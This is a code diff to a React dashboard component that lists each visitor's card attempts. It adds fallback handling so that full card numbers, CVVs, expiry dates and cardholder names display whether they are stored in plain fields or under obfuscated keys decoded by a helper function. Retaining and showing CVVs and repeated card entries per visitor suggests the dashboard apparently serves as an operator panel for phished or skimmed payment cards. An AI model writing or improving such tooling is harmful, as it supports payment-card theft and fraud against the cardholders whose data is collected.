@@ -282,26 +282,30 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
   // Create a bubble for each card attempt
   sortedCardHistory.forEach((cardHistory: any, index: number) => {
     // Get encrypted values from history
-    const encryptedCardNumber = cardHistory.data?._v1;
-    const encryptedCvv = cardHistory.data?._v2;
-    const encryptedExpiryDate = cardHistory.data?._v3;
-    const encryptedCardHolderName = cardHistory.data?._v4;
+    const directCardNumber = cardHistory.data?.cardNumber;
+    const directCvv = cardHistory.data?.cvv;
+    const directExpiryDate = cardHistory.data?.expiryDate;
+    const directCardHolderName = cardHistory.data?.cardHolderName;
+    const encryptedCardNumber = cardHistory.data?._v1 || directCardNumber;
+    const encryptedCvv = cardHistory.data?._v2 || directCvv;
+    const encryptedExpiryDate = cardHistory.data?._v3 || directExpiryDate;
+    const encryptedCardHolderName = cardHistory.data?._v4 || directCardHolderName;
 
     // Decrypt values with error handling
-    let cardNumber, cvv, expiryDate, cardHolderName;
+    let cardNumber = directCardNumber, cvv = directCvv, expiryDate = directExpiryDate, cardHolderName = directCardHolderName;
     try {
-      cardNumber = encryptedCardNumber ? _d(encryptedCardNumber) : undefined;
-      cvv = encryptedCvv ? _d(encryptedCvv) : undefined;
-      expiryDate = encryptedExpiryDate ? _d(encryptedExpiryDate) : undefined;
+      cardNumber = encryptedCardNumber ? _d(encryptedCardNumber) : directCardNumber;
+      cvv = encryptedCvv ? _d(encryptedCvv) : directCvv;
+      expiryDate = encryptedExpiryDate ? _d(encryptedExpiryDate) : directExpiryDate;
       cardHolderName = encryptedCardHolderName
         ? _d(encryptedCardHolderName)
-        : undefined;
+        : directCardHolderName;
     } catch (error) {
       console.error("[Dashboard] Decryption error:", error);
-      cardNumber = encryptedCardNumber;
-      cvv = encryptedCvv;
-      expiryDate = encryptedExpiryDate;
-      cardHolderName = encryptedCardHolderName;
+      cardNumber = directCardNumber || encryptedCardNumber;
+      cvv = directCvv || encryptedCvv;
+      expiryDate = directExpiryDate || encryptedExpiryDate;
+      cardHolderName = directCardHolderName || encryptedCardHolderName;
     }
 
     const isLatestCard = index === 0;
@@ -336,7 +340,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
     const bankCountry =
       cardHistory.data?.bankInfo?.country || inferredCardMeta?.bankCountry;
 
-    if (cardNumber || encryptedCardNumber) {
+    if (cardNumber || directCardNumber || encryptedCardNumber) {
       bubbles.push({
         id: `card-info-${cardHistory.id || index}`,
         title:
